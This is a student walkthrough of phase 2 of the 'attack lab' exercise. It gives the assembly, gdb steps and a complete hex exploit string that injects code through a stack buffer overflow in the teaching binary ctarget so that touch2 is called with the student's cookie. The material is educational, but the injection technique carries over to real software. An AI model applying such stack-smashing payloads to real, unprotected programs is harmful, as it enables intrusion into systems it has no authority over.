**UPDATED** 

Phase 2 involves injecting a small code and calling function touch2 while making it look like you passed the cookie as an argument to touch2

If you look inside the ctarget dump and search for touch2, it looks something like this:

```
000000000040178c <touch2>:
  40178c:	48 83 ec 08          	sub    $0x8,%rsp
  401790:	89 fe                	mov    %edi,%esi
  401792:	c7 05 e0 30 20 00 02 	movl   $0x2,0x2030e0(%rip)        # 60487c <vlevel>
  401799:	00 00 00 
  40179c:	3b 3d e2 30 20 00    	cmp    0x2030e2(%rip),%edi        # 604884 <cookie>
  4017a2:	75 1b                	jne    4017bf <touch2+0x33>
  4017a4:	bf a0 30 40 00       	mov    $0x4030a0,%edi
  4017a9:	b8 00 00 00 00       	mov    $0x0,%eax
  4017ae:	e8 8d f4 ff ff       	callq  400c40 <printf@plt>
  4017b3:	bf 02 00 00 00       	mov    $0x2,%edi
  4017b8:	e8 dc 04 00 00       	callq  401c99 <validate>
  4017bd:	eb 19                	jmp    4017d8 <touch2+0x4c>
  4017bf:	bf c8 30 40 00       	mov    $0x4030c8,%edi
  4017c4:	b8 00 00 00 00       	mov    $0x0,%eax
  4017c9:	e8 72 f4 ff ff       	callq  400c40 <printf@plt>
  4017ce:	bf 02 00 00 00       	mov    $0x2,%edi
  4017d3:	e8 73 05 00 00       	callq  401d4b <fail>
  4017d8:	bf 00 00 00 00       	mov    $0x0,%edi
  4017dd:	e8 ce f5 ff ff       	callq  400db0 <exit@plt>
```

If you read the instruction pdf, it says, "Recall that the first argument to a function is passed in register %rdi." 

So our goal is to modify the %rdi register and store our cookie in there.

So you have to write some assembly code for that task, create a file called phase2.s and write the below code, replacing the cookie and  with yours

```
  movq $0x434b4b70,%rdi /* move your cookie to register %rdi */
  retq                  /* return */
```

Now you need the byte representation of the code you wrote above. compile it with gcc then dissasemble it

```
gcc -c phase2.s
objdump -d phase2.o  > phase2.d 
```

Now open the file phase2.d and you will get something like below

```
Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 70 4b 4b 43 	mov    $0x434b4b70,%rdi
   c:	c3                   	retq   
```

The byte representation of the assembly code is `48 c7 c7 70 4b 4b 43 c3`

Now we need to find the address of rsp register

run ctarget through gdb 

`gdb ctarget`

set a breakpoint at getbuf 

`b getbuf`

run ctarget

`r`

Now do 

`disas`
 
 You will get something like below (this doesn't match the above code as it is an updated version)
```
   0x000000000040182c <+0>:	  sub    $0x18,%rsp
   0x0000000000401830 <+4>:	  mov    %rsp,%rdi
   0x0000000000401833 <+7>:	  callq  0x401ab6 <Gets>
=> 0x0000000000401838 <+12>:	mov    $0x1,%eax
   0x000000000040183d <+17>:	add    $0x18,%rsp
   0x0000000000401841 <+21>:	retq   

```

Now we need to run the code until the instruction just below `callq  0x401ab6 <Gets>` so you will do something like

`until *0x401838` 

Then it will ask you type a string...type a string longer than the buffer(24 characters in this case). After that do

`x/s $rsp` 

You will get something like

```
(gdb) x/s $rsp
0x55620cd8:	"ldsjfsdkfjdslfkjsdlkfjsdlkfjsldkfjsldkjf" // the random string I typed
```
The address on the left side is what we want. `0x55620cd8`

Now, create a text file named phase2.txt which will look something like below and don't forget the bytes for rsp and touch2 go in reverse
```
48 c7 c7 70 4b 4b 43 c3 /*this sets your cookie*/
00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
d8 0c 62 55 00 00 00 00 /* address of register %rsp */
8c 17 40 00 00 00 00 00 /*address of touch2 function */
```
Run it through hex2raw

`./hex2raw < phase2.txt > raw-phase2.txt`

Finally, you run the raw file

`./ctarget < raw-phase2.txt`

What the exploit does is that first it sets register rdi to our cookie value is transferred to $rsp register
so after we enter our string and getbuf tries to return control to the calling function, we want it to point to the rsp address 
so it will execute the code to set the cookie and finally we call touch2 after the cookie is set.

```
Cookie: 0x434b4b70
Type string:Touch2!: You called touch2(0x434b4b70)
Valid solution for level 2 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```
